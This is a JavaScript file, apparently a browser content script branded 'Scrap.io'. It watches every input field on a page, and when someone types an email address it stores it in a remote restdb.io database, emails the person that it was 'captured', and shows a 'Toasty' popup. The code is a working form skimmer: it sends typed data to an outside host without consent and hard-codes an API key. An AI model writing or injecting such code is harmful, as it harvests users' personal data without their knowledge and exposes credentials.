async function getEmailsFromDb() {
	const response = await fetch('https://scrapio-335b.restdb.io/rest/emails', {
		method: 'GET',
		headers: {
			'content-type': 'application/json',
			'x-apikey': '3cbd592182bfba0d6b3cc0c575b8c03b26993',
			'cache-control': 'no-cache'
		}
	});

	return response.json();
}

function postEmailToDb(capturedEmail) {
	fetch('https://scrapio-335b.restdb.io/rest/emails', {
		method: 'POST',
		headers: {
			'content-type': 'application/json',
			'x-apikey': '3cbd592182bfba0d6b3cc0c575b8c03b26993',
			'cache-control': 'no-cache'
		},
		body: JSON.stringify({ email: capturedEmail })
	});
}

function sendEmail(capturedEmail) {
	fetch('https://scrapio-335b.restdb.io/mail', {
		method: 'POST',
		headers: {
			'content-type': 'application/json',
			'x-apikey': '3cbd592182bfba0d6b3cc0c575b8c03b26993',
			'cache-control': 'no-cache'
		},
		body: JSON.stringify({
			'to': capturedEmail,
			'company': '',
			'sendername': 'Scrap.io',
			'subject': 'Your email was captured by Scrap.io',
			'html': `
				<h1>Your email, ${capturedEmail}, was captured!</h1>
				<p>Your email address is now known to the Scrap.io system.</p>
				<h4>Thank you!</h4>
				<p>- the Scrap.io Team</p>
			`
		})
	})
		.then(() => console.log(`Email sent to ${capturedEmail}.`));
}

function showToasty(capturedEmail) {
	if (!showToasty.isShowing) {
		showToasty.isShowing = true;

		getEmailsFromDb()
			.then(emailRecords => {
				const toastyContainer = document.createElement('DIV');
				toastyContainer.classList.add('toasty-container');

				const msgDisplay = document.createElement('H1');
				msgDisplay.style.textAlign = 'left';

				const toastyImg = document.createElement('IMG');
				toastyImg.src = 'https://i.imgur.com/83RbbSB.png';
				toastyImg.style.marginBottom = '-2px';

				const transitionTime = 333;
				const styleConfig = {
					position: 'absolute',
					bottom: 0,
					right: 0,
					display: 'block',
					transform: 'translate(100%)',
					transition: `transform ${transitionTime}ms linear`
				};

				for (let element of [msgDisplay, toastyImg]) {
					toastyContainer.appendChild(element);
				}

				for (let property in styleConfig) {
					toastyContainer.style[property] = styleConfig[property];
				}

				document.body.appendChild(toastyContainer);
				setTimeout(() => {
					toastyContainer.style.transform = 'translate(0)';

					setTimeout(() => {
						const emails = emailRecords.map(record => record.email);
						const emailIsKnown = emails.includes(capturedEmail);

						if (!emailIsKnown) {
							postEmailToDb(capturedEmail);
							sendEmail(capturedEmail);
						}

						msgDisplay.textContent = emailIsKnown ? 'I know you!' : 'email captured';
					}, transitionTime + 200);

					setTimeout(() => {
						msgDisplay.textContent = null;
						toastyContainer.style.transform = 'translate(100%)';
						showToasty.isShowing = false;
					}, 2000);
				}, 100);
			});
	}
}

function handleInputChange() {
	if (/.+@.+\.+.+/.test(this.value)) {
		showToasty(this.value);
	}
}

new MutationObserver(() => {
	for (let input of document.getElementsByTagName('INPUT')) {
		if (!input.scraperAdded) {
			input.addEventListener('change', handleInputChange);
			input.scraperAdded = true;
		}
	}
}).observe(document.body, { childList: true, subtree: true });